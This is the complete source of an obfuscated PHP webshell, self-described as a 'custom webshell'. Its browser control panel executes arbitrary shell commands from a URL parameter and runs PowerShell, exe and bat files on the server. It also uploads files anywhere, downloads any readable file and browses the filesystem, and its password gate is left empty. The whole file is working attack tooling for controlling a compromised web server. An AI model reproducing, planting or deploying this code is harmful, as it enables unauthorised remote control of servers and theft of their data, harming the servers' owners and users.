<!-- 
#̷𝓍   𝓐𝓡𝓢 𝓢𝓒𝓡𝓘𝓟𝓣𝓤𝓜 
#̷𝓍   custom webshell
-->



<?php $pakkhias1a1dc91c907325c69271ddf0='';global $equinabu868d3cb40d275143fc963b14;global $lwrokoge020b759adef679a47cb9afe9;if($pakkhias1a1dc91c907325c69271ddf0!=null){if(isset($_COOKIE['pass'])){if(hash('sha512',$_COOKIE['pass'])!==$pakkhias1a1dc91c907325c69271ddf0){echo "Wrong password !";exit;}}else{echo "Wrong password !";exit;}}function Rolleb65a6c2(string $icnwxrdjd6fe1d0be6347b8ef2427fa6):string{$icnwxrdjd6fe1d0be6347b8ef2427fa6=mb_ereg_replace('\\\\|/','/',$icnwxrdjd6fe1d0be6347b8ef2427fa6,'msr');$ndrvxlky3ff401a37a03fe7c08117faf=$icnwxrdjd6fe1d0be6347b8ef2427fa6[0]==='/';preg_match('/^[a-z]:/',$icnwxrdjd6fe1d0be6347b8ef2427fa6,$utbnlmmt9c28d32df234037773be184d);$mzbavxvj3ecab05b5b8340f3ad9a85c4=isset($utbnlmmt9c28d32df234037773be184d[0])?$utbnlmmt9c28d32df234037773be184d[0]:false;$vyaktkgcb6a8e8682249b56898e11f47=array_filter(explode('/',$icnwxrdjd6fe1d0be6347b8ef2427fa6),'mb_strlen');$eedjqitv81406cf89f2a977dae20d55f=[];foreach($vyaktkgcb6a8e8682249b56898e11f47 as $vcivsuxv1634b7ef7a71f9ae79c4b3b3){if('.'===$vcivsuxv1634b7ef7a71f9ae79c4b3b3){continue;}if('..'===$vcivsuxv1634b7ef7a71f9ae79c4b3b3&&!$ndrvxlky3ff401a37a03fe7c08117faf&&!$mzbavxvj3ecab05b5b8340f3ad9a85c4&&empty(array_filter($eedjqitv81406cf89f2a977dae20d55f,function($nenxvdcu2063c1608d6e0baf80249c42){return!('..'===$nenxvdcu2063c1608d6e0baf80249c42);}))){$eedjqitv81406cf89f2a977dae20d55f[]=$vcivsuxv1634b7ef7a71f9ae79c4b3b3;continue;}if('..'===$vcivsuxv1634b7ef7a71f9ae79c4b3b3){array_pop($eedjqitv81406cf89f2a977dae20d55f);continue;}$eedjqitv81406cf89f2a977dae20d55f[]=$vcivsuxv1634b7ef7a71f9ae79c4b3b3;}return(($ndrvxlky3ff401a37a03fe7c08117faf?'/':$mzbavxvj3ecab05b5b8340f3ad9a85c4)?$mzbavxvj3ecab05b5b8340f3ad9a85c4.'/':'').implode('/',$eedjqitv81406cf89f2a977dae20d55f);}if(isset($_POST['upload'])){$oadjpvzb14402cfaa3089ce288adfbda=Apologize9c62c03e();$kbvnfoma87f85f26c826cf7ccb2ae98b=$oadjpvzb14402cfaa3089ce288adfbda.'/'.basename($_FILES['file']['name']);if(file_exists($kbvnfoma87f85f26c826cf7ccb2ae98b)){echo "<script>alert('Error: File already exists !')</script>";}else if(move_uploaded_file($_FILES['file']['tmp_name'],$kbvnfoma87f85f26c826cf7ccb2ae98b)){echo "<script>alert('File uploaded successfuly !')</script>";}else{echo "<script>alert('Error: Could not upload file !')</script>";}}else if(isset($_GET['runscript'])){$uvdgtwug3205c0ded576131ea255ad2b=$_GET['runscript'];$qasxycdi0d858590b2752462cbbd205a=Rolleb65a6c2($uvdgtwug3205c0ded576131ea255ad2b);$jzqxrtlp1dccadfed7bcbb036c56a4af='pwsh -Noni -Nop -File "'.$qasxycdi0d858590b2752462cbbd205a.'"';global $equinabu868d3cb40d275143fc963b14;global $lwrokoge020b759adef679a47cb9afe9;$equinabu868d3cb40d275143fc963b14=shell_exec($jzqxrtlp1dccadfed7bcbb036c56a4af);}else if(isset($_GET['runexe'])){$uvdgtwug3205c0ded576131ea255ad2b=$_GET['runexe'];$qasxycdi0d858590b2752462cbbd205a=Rolleb65a6c2($uvdgtwug3205c0ded576131ea255ad2b);$jzqxrtlp1dccadfed7bcbb036c56a4af=$qasxycdi0d858590b2752462cbbd205a;exec('cd '.realpath(Apologize9c62c03e()).' && '.$qasxycdi0d858590b2752462cbbd205a,$equinabu868d3cb40d275143fc963b14,$lwrokoge020b759adef679a47cb9afe9);}else if(isset($_GET['runbat'])){$uvdgtwug3205c0ded576131ea255ad2b=$_GET['runbat'];$qasxycdi0d858590b2752462cbbd205a=Rolleb65a6c2($uvdgtwug3205c0ded576131ea255ad2b);$jzqxrtlp1dccadfed7bcbb036c56a4af='pwsh -Noni -Nop -Command { Start-Process "cmd.exe" -ArgumentList @("/k","'.$qasxycdi0d858590b2752462cbbd205a.') }';exec('cd '.realpath(Apologize9c62c03e()).' && '.$qasxycdi0d858590b2752462cbbd205a,$equinabu868d3cb40d275143fc963b14,$lwrokoge020b759adef679a47cb9afe9);}if(isset($_GET['download'])){$xbxyiopj8c7dd922ad47494fc02c388e=$_GET['download'];if(file_exists($xbxyiopj8c7dd922ad47494fc02c388e)){if(is_readable($xbxyiopj8c7dd922ad47494fc02c388e)){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($xbxyiopj8c7dd922ad47494fc02c388e).'"');header('Expires: 0');header('Cache-Control: must-revalidate');header('Pragma: public');header('Content-Length: '.filesize($xbxyiopj8c7dd922ad47494fc02c388e));readfile($xbxyiopj8c7dd922ad47494fc02c388e);exit;}else{echo "<script>alert('Error: Could not read the file !')</script>";exit;}}}function Considera914cfeb(){return 'rgb(32, 0, 128)';}function Consider4ffe5590(){return '#00ff00';}function Achievefe605bb9(){return '#d92626';}function Place6a0dbc4e(){return '#ff0066';}function Share76fbc4b3(){return '#3ADF00';}function Finish3bf91db4(){return '#3ADF00';}function Apologize9c62c03eectoryColor(){return '#3ADF00';}function Imagine9e01f282(){return '#ff5500';}function Escapef4cf4c96(){return '#C0C0C0';}function Warn8241a493(){return '#C0C0C0';}function Mean11a8412c(){return '#3ADF00';}function Invite66d16b5f($befrpxlsc9e9a848920877e76685b2e4){switch($befrpxlsc9e9a848920877e76685b2e4){case 1:return '#101010';break;case 2:return '#202020';break;case 3:return '#303030';break;case 4:return '#404040';break;default:return '#404040';}return '#404040';}function Lose60c8a954($nlqaevdrb068931cc450442b63f5b3d2){$syvfmtrw7b8b965ad4bca0e41ab51de7=strrpos($nlqaevdrb068931cc450442b63f5b3d2,'.');return($syvfmtrw7b8b965ad4bca0e41ab51de7===false)?'':substr($nlqaevdrb068931cc450442b63f5b3d2,$syvfmtrw7b8b965ad4bca0e41ab51de7+1);}function Click7d588283($ssqvmimt435ed7e9f07f740abf511a62){$lwrokoge020b759adef679a47cb9afe9='';$hrioqavva3da707b651c79ecc39a4986=Apologize9c62c03e().'/'.$ssqvmimt435ed7e9f07f740abf511a62;if(is_dir($hrioqavva3da707b651c79ecc39a4986)){$lwrokoge020b759adef679a47cb9afe9.='<td style="color: "'.Apologize9c62c03eectoryColor().'">';$lwrokoge020b759adef679a47cb9afe9.=htmlspecialchars('<dir>');}else{$lwrokoge020b759adef679a47cb9afe9.='<td style="color: "'.Achievefe605bb9().'">';$covuegwc93d565f07a1ee62504ba94b6=Requirebdc0c894(filesize($hrioqavva3da707b651c79ecc39a4986));$lwrokoge020b759adef679a47cb9afe9.=$covuegwc93d565f07a1ee62504ba94b6;}$lwrokoge020b759adef679a47cb9afe9.='</td>';return $lwrokoge020b759adef679a47cb9afe9;}function Trashdea78ad2($ssqvmimt435ed7e9f07f740abf511a62){$lwrokoge020b759adef679a47cb9afe9='';$iviyltysabf77184f55403d75b9d51d7=pathinfo($ssqvmimt435ed7e9f07f740abf511a62,PATHINFO_EXTENSION);switch($iviyltysabf77184f55403d75b9d51d7){case "ps1":$lwrokoge020b759adef679a47cb9afe9.='<td style="color: "'.Achievefe605bb9().'">';$lwrokoge020b759adef679a47cb9afe9.=Smoke2ea0bf92($ssqvmimt435ed7e9f07f740abf511a62);break;case "bat":$lwrokoge020b759adef679a47cb9afe9.='<td style="color: "'.Achievefe605bb9().'">';$lwrokoge020b759adef679a47cb9afe9.=Delivera54a703d($ssqvmimt435ed7e9f07f740abf511a62);break;case "exe":$lwrokoge020b759adef679a47cb9afe9.='<td style="color: "'.Achievefe605bb9().'">';$lwrokoge020b759adef679a47cb9afe9.=Say3457edbe($ssqvmimt435ed7e9f07f740abf511a62);break;default:$lwrokoge020b759adef679a47cb9afe9.='<td style="color: "'.Achievefe605bb9().'">';$lwrokoge020b759adef679a47cb9afe9.=htmlspecialchars('noop');}$lwrokoge020b759adef679a47cb9afe9.='</td>';return $lwrokoge020b759adef679a47cb9afe9;}function Bear419b9bf1($xbxyiopj8c7dd922ad47494fc02c388e){$unwhisxw15d61712450a686a7f365adf=fileperms($xbxyiopj8c7dd922ad47494fc02c388e);if($unwhisxw15d61712450a686a7f365adf&0x1000){$hybomywa599dcce2998a6b40b1e38e8c='p';}else if($unwhisxw15d61712450a686a7f365adf&0x2000){$hybomywa599dcce2998a6b40b1e38e8c='c';}else if($unwhisxw15d61712450a686a7f365adf&0x4000){$hybomywa599dcce2998a6b40b1e38e8c='d';}else if($unwhisxw15d61712450a686a7f365adf&0x6000){$hybomywa599dcce2998a6b40b1e38e8c='b';}else if($unwhisxw15d61712450a686a7f365adf&0x8000){$hybomywa599dcce2998a6b40b1e38e8c='-';}else if($unwhisxw15d61712450a686a7f365adf&0xA000){$hybomywa599dcce2998a6b40b1e38e8c='l';}else if($unwhisxw15d61712450a686a7f365adf&0xC000){$hybomywa599dcce2998a6b40b1e38e8c='s';}else $hybomywa599dcce2998a6b40b1e38e8c='u';$bwwomlca72122ce96bfec66e2396d2e2["read"]=($unwhisxw15d61712450a686a7f365adf&00400)?'r':'-';$bwwomlca72122ce96bfec66e2396d2e2["write"]=($unwhisxw15d61712450a686a7f365adf&00200)?'w':'-';$bwwomlca72122ce96bfec66e2396d2e2["execute"]=($unwhisxw15d61712450a686a7f365adf&00100)?'x':'-';$gmpxtospdb0f6f37ebeb6ea094891243["read"]=($unwhisxw15d61712450a686a7f365adf&00040)?'r':'-';$gmpxtospdb0f6f37ebeb6ea094891243["write"]=($unwhisxw15d61712450a686a7f365adf&00020)?'w':'-';$gmpxtospdb0f6f37ebeb6ea094891243["execute"]=($unwhisxw15d61712450a686a7f365adf&00010)?'x':'-';$gonevxtg7d793037a0760186574b0282["read"]=($unwhisxw15d61712450a686a7f365adf&00004)?'r':'-';$gonevxtg7d793037a0760186574b0282["write"]=($unwhisxw15d61712450a686a7f365adf&00002)?'w':'-';$gonevxtg7d793037a0760186574b0282["execute"]=($unwhisxw15d61712450a686a7f365adf&00001)?'x':'-';if($unwhisxw15d61712450a686a7f365adf&0x800)$bwwomlca72122ce96bfec66e2396d2e2["execute"]=($bwwomlca72122ce96bfec66e2396d2e2['execute']=='x')?'s':'S';if($unwhisxw15d61712450a686a7f365adf&0x400)$gmpxtospdb0f6f37ebeb6ea094891243["execute"]=($gmpxtospdb0f6f37ebeb6ea094891243['execute']=='x')?'s':'S';if($unwhisxw15d61712450a686a7f365adf&0x200)$gonevxtg7d793037a0760186574b0282["execute"]=($gonevxtg7d793037a0760186574b0282['execute']=='x')?'t':'T';$bwlhnfme03c7c0ace395d80182db07ae=sprintf("%1s",$hybomywa599dcce2998a6b40b1e38e8c);$bwlhnfme03c7c0ace395d80182db07ae.=sprintf("%1s%1s%1s",$bwwomlca72122ce96bfec66e2396d2e2['read'],$bwwomlca72122ce96bfec66e2396d2e2['write'],$bwwomlca72122ce96bfec66e2396d2e2['execute']);$bwlhnfme03c7c0ace395d80182db07ae.=sprintf("%1s%1s%1s",$gmpxtospdb0f6f37ebeb6ea094891243['read'],$gmpxtospdb0f6f37ebeb6ea094891243['write'],$gmpxtospdb0f6f37ebeb6ea094891243['execute']);$bwlhnfme03c7c0ace395d80182db07ae.=sprintf("%1s%1s%1s",$gonevxtg7d793037a0760186574b0282['read'],$gonevxtg7d793037a0760186574b0282['write'],$gonevxtg7d793037a0760186574b0282['execute']);return $bwlhnfme03c7c0ace395d80182db07ae;}function Requirebdc0c894($zdchdhao4b3a6218bb3e3a7303e8a171){if($zdchdhao4b3a6218bb3e3a7303e8a171>=1073741824){$zdchdhao4b3a6218bb3e3a7303e8a171=number_format($zdchdhao4b3a6218bb3e3a7303e8a171/1073741824,2).' GB';}elseif($zdchdhao4b3a6218bb3e3a7303e8a171>=1048576){$zdchdhao4b3a6218bb3e3a7303e8a171=number_format($zdchdhao4b3a6218bb3e3a7303e8a171/1048576,2).' MB';}elseif($zdchdhao4b3a6218bb3e3a7303e8a171>=1024){$zdchdhao4b3a6218bb3e3a7303e8a171=number_format($zdchdhao4b3a6218bb3e3a7303e8a171/1024,2).' KB';}elseif($zdchdhao4b3a6218bb3e3a7303e8a171>1){$zdchdhao4b3a6218bb3e3a7303e8a171=$zdchdhao4b3a6218bb3e3a7303e8a171.' bytes';}elseif($zdchdhao4b3a6218bb3e3a7303e8a171==1){$zdchdhao4b3a6218bb3e3a7303e8a171=$zdchdhao4b3a6218bb3e3a7303e8a171.' byte';}else{$zdchdhao4b3a6218bb3e3a7303e8a171='0 bytes';}return $zdchdhao4b3a6218bb3e3a7303e8a171;}function Apologize9c62c03e(){returnisset($_GET['dir'])?realpath($_GET['dir']):getcwd();}function Wantc5a0b050($xbxyiopj8c7dd922ad47494fc02c388e){if(is_dir(Apologize9c62c03e().'/'.$xbxyiopj8c7dd922ad47494fc02c388e)){return '<a href="'.$_SERVER['PHP_SELF'].'?dir='.realpath(Apologize9c62c03e().'/'.$xbxyiopj8c7dd922ad47494fc02c388e).'">'.$xbxyiopj8c7dd922ad47494fc02c388e.'</a>';}else{return '<a href="'.$_SERVER['PHP_SELF'].'?download='.realpath(Apologize9c62c03e().'/'.$xbxyiopj8c7dd922ad47494fc02c388e).'">'.$xbxyiopj8c7dd922ad47494fc02c388e.'</a>';}}function Smoke2ea0bf92($xbxyiopj8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?runscript='.Rolleb65a6c2(Apologize9c62c03e().'/'.$xbxyiopj8c7dd922ad47494fc02c388e).'&dir='.realpath(Apologize9c62c03e()).'">'.'run</a>';}function Say3457edbe($xbxyiopj8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?runexe='.Rolleb65a6c2(Apologize9c62c03e().'/'.$xbxyiopj8c7dd922ad47494fc02c388e).'&dir='.realpath(Apologize9c62c03e()).'">'.'run</a>';}function Delivera54a703d($xbxyiopj8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?runbat='.Rolleb65a6c2(Apologize9c62c03e().'/'.$xbxyiopj8c7dd922ad47494fc02c388e).'&dir='.realpath(Apologize9c62c03e()).'">'.'run</a>';}function Stick0a23d765(){$gkcejgwt45b963397aa40d4a0063e0d8=scandir(Apologize9c62c03e());$rbaqkiudcc935c5faf4c8f7a0468d755=true;if($gkcejgwt45b963397aa40d4a0063e0d8!=null){foreach($gkcejgwt45b963397aa40d4a0063e0d8 as $ssqvmimt435ed7e9f07f740abf511a62){echo '<tr style="background-color:'.($rbaqkiudcc935c5faf4c8f7a0468d755?'#515151':'#212121').';">';echo '<td style="font-weight:thin;">'.Wantc5a0b050($ssqvmimt435ed7e9f07f740abf511a62).'</td>';echo ''.Click7d588283($ssqvmimt435ed7e9f07f740abf511a62).'';echo ''.Trashdea78ad2($ssqvmimt435ed7e9f07f740abf511a62).'';echo '</tr>';$rbaqkiudcc935c5faf4c8f7a0468d755=!$rbaqkiudcc935c5faf4c8f7a0468d755;}}else{echo "<p>Couldn't open that directory !";}}function Exercisea39147f5(){global $equinabu868d3cb40d275143fc963b14;global $lwrokoge020b759adef679a47cb9afe9;if($lwrokoge020b759adef679a47cb9afe9==0){if($equinabu868d3cb40d275143fc963b14!=null){foreach($equinabu868d3cb40d275143fc963b14 as $xtrqrnmc6438c669e0d0de98e6929c2c){if($xtrqrnmc6438c669e0d0de98e6929c2c!=null){echo "<br>";echo htmlspecialchars($xtrqrnmc6438c669e0d0de98e6929c2c);echo "\n";}}}}else{echo "Execution failed with error code: ".$lwrokoge020b759adef679a47cb9afe9;}}function Sleep604b7eb8(){$bvwvatmt0897acf49c7c1ea9f76efe59=gethostname()?? 'none';$hmvzcvch14c4b06b824ec59323936251=get_current_user();$mjivhyds736007832d2167baaae763fd=Apologize9c62c03e();$zugoelbxdfff0a7fa1a55c8c1a4966c1=isset($_GET['cmd'])?$_GET['cmd']:'';return '<span style="color: #ff6347">'.$hmvzcvch14c4b06b824ec59323936251.'@'.$bvwvatmt0897acf49c7c1ea9f76efe59.'</span>: <span style="color: #B40404">'.$mjivhyds736007832d2167baaae763fd.'</span>$ '.$zugoelbxdfff0a7fa1a55c8c1a4966c1;}if(isset($_GET['cmd'])){exec('cd '.realpath(Apologize9c62c03e()).' && '.$_GET['cmd'],$equinabu868d3cb40d275143fc963b14,$lwrokoge020b759adef679a47cb9afe9);}?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>My WebShell</title>
        
        <script>
            function Cancel8fcf0281() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
        </script>
        <style>
            :root {
                --header-color: <?php echo Considera914cfeb();?>;
                --background-color-1: <?php echo Invite66d16b5f(1);?>;
                --background-color-2: <?php echo Invite66d16b5f(2);?>;
                --background-color-3: <?php echo Invite66d16b5f(3);?>;
                --background-color-4: <?php echo Invite66d16b5f(4);?>;
                --primary-color: <?php echo Consider4ffe5590();?>;
                --secondary-color: <?php echo Achievefe605bb9();?>;
                --command-color: <?php echo Place6a0dbc4e();?>;
                --commandoutput-color: <?php echo Share76fbc4b3();?>;
                --explorer-color: <?php echo Finish3bf91db4();?>;
                --directory-color: <?php echo Apologize9c62c03eectoryColor();?>;
                --navtext-color: <?php echo Imagine9e01f282();?>;
                --navtext-hover-color: <?php echo Warn8241a493();?>;
                --header-text-color: <?php echo Escapef4cf4c96();?>;
                --buttons-color: <?php echo Mean11a8412c();?>;
            }
        </style>
        <script>
            const popupHtmlUploadFile = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a file to upload</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.Apologize9c62c03e()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="Run837951e2()">Cancel</button>
                                <input type="submit" value="Upload" name="upload">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            const popupHtmlRunPowerShellScript = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a script to run...</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.Apologize9c62c03e()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="Run837951e2()">Cancel</button>
                                <input type="submit" value="runpwsh" name="runpwsh">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            function Improve97689f25() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlUploadFile + bodyHTML;
            }
            function Match580b15c4() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlRunPowerShellScript + bodyHTML;
            }
            function Run837951e2() {
                const body = document.getElementsByTagName('body')[0];
                body.removeChild(body.getElementsByClassName('popup-container')[0]); 
            }
        </script>
    </head>
    <body class="body-container">   
        <header>
            <nav>
                <h1>> control panel</h1>
                <div class="nav-items">
                    <a onclick="Improve97689f25()">[upload]</a>
                    <a onclick="Cancel8fcf0281()">[cd]</a>
                </div>
            </nav>
        </header>
        <div class="content-container">
            <div class="explorer-panel">
                <h4>Exploring: <?php echo Apologize9c62c03e()?></h4>
                <table>
                    <tr style="background-color:var(--header-color);">
                        <th>Folder / <span style="font-weight: lighter;">File</span></th>
                        <!--<th>Owner</th>
                        //<th>Permissions</th> -->
                        <th>Size</th>
                        <th>Actions</th>
                    </tr>
                    <?php Stick0a23d765()?>
                </table>
            </div>
            <div class="command-panel">
                <div class="command-output">
                    <p><?php echo Sleep604b7eb8()?></p>
                    <p><?php Exercisea39147f5()?></p>
                </div>
                <form id="command-input" action="<?php echo $_SERVER['PHP_SELF']?>" method="get">
                    <input type="text" name="cmd">
                    <input type="hidden" name="dir" value="<?php echo Apologize9c62c03e()?>"/>
                    <button action="submit">
                        <p>Send</p>
                    </button>
                </form>
            </div>
        </div>
        <style>



            html, body {
                width: 100%;
                height: 100%;
                margin: 0;
                padding: 0;
                background-color: var(--background-color-2);
                
            }

            .body-container {
                display: grid;
                grid-template-rows: 50px calc(100% - 50px);
            }

            header {
                z-index:1;
                background-color: var(--header-color);
                box-shadow: 0px 2px 6px black;
            }

            header nav {
                height: 100%;
                display: flex;
                justify-content: flex-start;     
                color: var(--header-text-color);
                font-family: 'Consolas', monospace;
            }

            header h1 {
                height: 100%;
                margin: 0;
                margin-left: 20px;
                text-align: center;
                line-height: 50px;
                font-size: 24px;
            }

            header .nav-items {
                height: 100%;
                width: auto;
                margin: 0;
                display: flex;
                flex-grow: 1;
                justify-content: flex-end;
            }

            header .nav-items a {
                height: 100%;
                margin-right: 30px;
                color: var(--navtext-color);
                font-size: 12px;
                text-decoration: none;
                line-height: 50px;
                text-align:center;
                transition: ease-in 0.2s;     
            }

            header .nav-items a:hover {
                color:  var(--navtext-hover-color);
                cursor: pointer;
            }

            .content-container {
                height: 100%;
                position: relative;
                display: grid;
                grid-template-columns: 30% 70%;      
                color:  rgb(0, 128, 255);
                font-family: 'Consolas', monospace;
            }

            .explorer-panel {
                background-color: var(--background-color-3);
                color: var(--explorer-color);
                font-family: 'Consolas', monospace;
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                box-shadow: 0px 0px 4px black;
                padding: 3px;
            }

            .explorer-panel h4 {
                margin: 10px;
                font-size: 12px;
                color: var(--explorer-color);
            }

            .explorer-panel table {font-size
                width: 100%;
                word-wrap: break-word;
                border-spacing: 2px;
                table-layout: auto;
                color: hsl(30, 100%, 50%);
                background-color: var(--background-color-2);
                font-size: 12px;
            }

            .explorer-panel table td {
                padding: 1px 2px;
            }

            .explorer-panel table a {
                color: var(--primary-color);
                text-decoration: none;         
            }

            .explorer-panel table a:hover {
                color: var(--secondary-color);
                transition: ease 0.2s;
                font-size: 12px;
            }

            .command-panel {    
                margin: 20px;
                padding: 15px;
                border-radius: 5px;
                color: var(--command-color);
                background-color: var(--background-color-3);
                display: grid;
                grid-template-rows: 93% calc(7% - 15px);
                row-gap: 15px;
                box-shadow: 0px 0px 6px black;
                font-size: 8px;
            }

            .command-output {
                padding: 5px;
                border-radius: 5px;
                background-color: var(--background-color-1);              
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                font-family: 'Consolas', monospace;
                color: var(--commandoutput-color);
            }

            .command-output p {
                margin: 0px;
                font-family: 'Consolas', monospace;
            }

            #command-input {
                display: grid;
                grid-template-columns: 89% 10%;
                grid-template-rows: 100%;
                column-gap: 1%;
            }

            #command-input input{
                height: 100%;
                width: 100%;
                border-radius: 5px;
                border: none;
                background-color: var(--background-color-2);        
                color: var(--command-color);
                font-size: 12px;
            }

            #command-input button{
                height: 100%;
                width: 100%;
                border: none;
                border-radius: 5px;
                background-color: var(--background-color-4);  
                cursor: pointer;
            }

            #command-input button:hover{
                background-color: var(--primary-color);
                transition: ease-in-out 0.3s;
            }

            #command-input button p{
                margin:0;
                color: var(--buttons-color);
                font-family: 'Consolas', monospace;
                font-size: 12px;
                font-weight: bolder;
                line-height: 100%;
            }


            .popup-container {
                z-index: 5;
                position: fixed;
                background-color: rgba(10,10,10, 0.6);
                width: 100%;
                height: 100%;
                display: grid;
                justify-content: center;
                align-content: center;
                grid-template-columns: 30%;
                grid-template-rows: 35%;
            }

            .popup {
                background-color: var(--background-color-3);
                border-radius: 5px;
                box-shadow: 0px 2px 6px black;
                display: grid;
                grid-template-rows: 20% 70%;
                row-gap: 10%;
                padding: 2.5%;
            }

            .popup h4{
                text-align: center;
                font-family: 'Consolas', monospace;
                font-size: 12px;
            }

            .popup form {
                display: grid;
                grid-template-rows: 80% 20%;
                grid-template-columns: 95%;
                justify-content: center;
                align-content: center;
            }

            .popup-buttons {
                height: 100%;
                display: inline-flex;
                flex-wrap: wrap;
                gap: 10%;
            }

            .popup-buttons button {
                width: 45%;
                background-color: var(--background-color-4);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons button:hover {
                background-color: var(--background-color-2);
                cursor: pointer;            
            }

            .popup-buttons input {
                width: 45%;
                background-color: var(--primary-color);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons input:hover {
                background-color: var(--secondary-color);
                cursor: pointer; 
            }
        </style>
    </body>
</html>





